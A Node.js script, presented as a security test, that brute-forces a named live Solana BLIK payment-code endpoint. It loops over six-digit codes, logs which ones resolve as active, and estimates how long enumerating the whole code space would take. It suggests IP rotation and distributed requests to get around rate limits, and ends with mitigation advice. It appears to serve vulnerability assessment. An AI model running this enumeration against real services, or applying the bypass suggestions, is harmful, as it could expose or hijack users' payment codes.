#!/usr/bin/env node

/**
 * Security Test: Code Enumeration Feasibility Assessment
 * Target: Solana BLIK API - Code Resolution Endpoint
 */

const https = require("https");
const http = require("http");

const BASE_URL = "https://solana-blik.vercel.app/api/codes/{}/resolve";
const START_CODE = 100000;
const END_CODE = 100100;
const TOTAL_CODE_SPACE = 900000;

const results = {
  successful: 0,
  rateLimited: 0,
  errors: 0,
  validCodes: [],
  statusCodes: {},
  responseTimes: [],
};

function makeRequest(code) {
  return new Promise((resolve) => {
    const url = BASE_URL.replace("{}", code);
    const urlObj = new URL(url);
    const requestStart = Date.now();

    const req = https.get(
      {
        hostname: urlObj.hostname,
        path: urlObj.pathname,
        timeout: 10000,
      },
      (res) => {
        const requestDuration = Date.now() - requestStart;
        results.responseTimes.push(requestDuration);

        const statusCode = res.statusCode;
        results.statusCodes[statusCode] =
          (results.statusCodes[statusCode] || 0) + 1;

        let data = "";
        res.on("data", (chunk) => {
          data += chunk;
        });

        res.on("end", () => {
          if (statusCode === 200) {
            results.successful++;
            try {
              const json = JSON.parse(data);
              const status = json.status || "unknown";

              if (status === "waiting" || status === "linked") {
                results.validCodes.push({ code, status, data: json });
                console.log(
                  `✓ Code ${code}: ${status.toUpperCase()} - VALID CODE FOUND!`
                );
              } else {
                console.log(`  Code ${code}: ${status}`);
              }
            } catch (e) {
              console.log(`  Code ${code}: HTTP 200 (parse error: ${e.message})`);
            }
          } else if (statusCode === 429) {
            results.rateLimited++;
            console.log(`✗ Code ${code}: RATE LIMITED (429)`);
          } else if (statusCode === 404) {
            console.log(`  Code ${code}: Not found`);
          } else {
            results.errors++;
            console.log(`✗ Code ${code}: HTTP ${statusCode}`);
          }

          resolve();
        });
      }
    );

    req.on("error", (err) => {
      results.errors++;
      console.log(`✗ Code ${code}: ERROR - ${err.message}`);
      resolve();
    });

    req.on("timeout", () => {
      req.destroy();
      results.errors++;
      console.log(`✗ Code ${code}: TIMEOUT`);
      resolve();
    });
  });
}

async function testEnumeration() {
  console.log("=".repeat(70));
  console.log("SECURITY TEST: Code Enumeration Feasibility");
  console.log("=".repeat(70));
  console.log(`Target: ${BASE_URL.replace("{}", "XXXXXX")}`);
  console.log(`Test Range: ${START_CODE} - ${END_CODE}`);
  console.log(`Total Codes to Test: ${END_CODE - START_CODE + 1}`);
  console.log(
    `Start Time: ${new Date().toISOString().replace("T", " ").slice(0, 19)}`
  );
  console.log("-".repeat(70));

  const startTime = Date.now();

  // Test each code sequentially
  for (let code = START_CODE; code <= END_CODE; code++) {
    await makeRequest(code);
  }

  const endTime = Date.now();
  const totalDuration = (endTime - startTime) / 1000; // in seconds

  // Calculate metrics
  const totalRequests = END_CODE - START_CODE + 1;
  const requestsPerSecond =
    totalDuration > 0 ? totalRequests / totalDuration : 0;
  const avgResponseTime =
    results.responseTimes.length > 0
      ? results.responseTimes.reduce((a, b) => a + b, 0) /
        results.responseTimes.length / 1000
      : 0;

  // Calculate full enumeration time
  let fullEnumerationSeconds, fullEnumerationMinutes, fullEnumerationHours;
  if (requestsPerSecond > 0) {
    fullEnumerationSeconds = TOTAL_CODE_SPACE / requestsPerSecond;
    fullEnumerationMinutes = fullEnumerationSeconds / 60;
    fullEnumerationHours = fullEnumerationMinutes / 60;
  } else {
    fullEnumerationSeconds = Infinity;
    fullEnumerationMinutes = Infinity;
    fullEnumerationHours = Infinity;
  }

  // Print summary
  console.log("\n" + "=".repeat(70));
  console.log("TEST RESULTS SUMMARY");
  console.log("=".repeat(70));
  console.log(`Total Requests Sent:        ${totalRequests}`);
  console.log(`Successful Requests (200):  ${results.successful}`);
  console.log(`Rate Limited (429):         ${results.rateLimited}`);
  console.log(`Errors:                     ${results.errors}`);
  console.log(`Valid Codes Found:          ${results.validCodes.length}`);
  console.log();

  console.log("Status Code Distribution:");
  Object.keys(results.statusCodes)
    .sort()
    .forEach((code) => {
      console.log(`  HTTP ${code}: ${results.statusCodes[code]} requests`);
    });
  console.log();

  console.log("Performance Metrics:");
  console.log(`  Total Time:              ${totalDuration.toFixed(2)} seconds`);
  console.log(
    `  Average Response Time:   ${avgResponseTime.toFixed(3)} seconds`
  );
  console.log(
    `  Requests per Second:     ${requestsPerSecond.toFixed(2)} req/s`
  );
  console.log();

  console.log("=".repeat(70));
  console.log("ATTACK FEASIBILITY ANALYSIS");
  console.log("=".repeat(70));
  console.log(
    `Total Code Space:           ${TOTAL_CODE_SPACE.toLocaleString()} codes (100000-999999)`
  );
  console.log(
    `Measured Rate:              ${requestsPerSecond.toFixed(2)} requests/second`
  );
  console.log();

  if (results.rateLimited > 0) {
    console.log("⚠️  RATE LIMITING DETECTED!");
    console.log(
      `   ${results.rateLimited} requests were rate limited (HTTP 429)`
    );
    console.log(
      `   Rate limiting kicked in at: ${results.rateLimited} / ${totalRequests} requests`
    );
    console.log();
  }

  console.log("Mathematical Proof - Full Enumeration Time:");
  console.log(`  At ${requestsPerSecond.toFixed(2)} req/s:`);
  console.log(
    `    • ${TOTAL_CODE_SPACE.toLocaleString()} codes ÷ ${requestsPerSecond.toFixed(2)} req/s`
  );
  console.log(
    `    • = ${fullEnumerationSeconds.toLocaleString("en-US", { maximumFractionDigits: 0 })} seconds`
  );
  console.log(
    `    • = ${fullEnumerationMinutes.toLocaleString("en-US", { maximumFractionDigits: 1 })} minutes`
  );
  console.log(
    `    • = ${fullEnumerationHours.toLocaleString("en-US", { maximumFractionDigits: 2 })} hours`
  );
  console.log();

  // Verdict
  console.log("=".repeat(70));
  console.log("SECURITY VERDICT");
  console.log("=".repeat(70));

  if (results.rateLimited > 0) {
    console.log("⚠️  PARTIALLY VULNERABLE");
    console.log("   Rate limiting exists but may be bypassable with:");
    console.log("   - Distributed attack (multiple IPs)");
    console.log("   - Slower enumeration over longer time period");
    console.log("   - IP rotation techniques");
  } else {
    console.log("🚨 CRITICALLY VULNERABLE");
    console.log("   NO RATE LIMITING DETECTED!");
    console.log("   Full code space enumeration is FEASIBLE!");
  }

  console.log();

  if (results.validCodes.length > 0) {
    console.log(
      `⚠️  VALID CODES DISCOVERED: ${results.validCodes.length}`
    );
    console.log("   Codes found in test range:");
    results.validCodes.forEach((valid) => {
      console.log(`   - Code ${valid.code}: ${valid.status}`);
    });
    console.log();
  }

  console.log("Recommendation:");
  console.log("  1. Implement strict rate limiting (e.g., 10 requests per minute)");
  console.log("  2. Add CAPTCHA after N failed attempts");
  console.log("  3. Use longer, non-sequential code format");
  console.log("  4. Implement account-level throttling");
  console.log("  5. Add exponential backoff for repeated attempts");
  console.log("=".repeat(70));
}

testEnumeration().catch((err) => {
  console.error("\n\nTest failed with error:", err);
  process.exit(1);
});
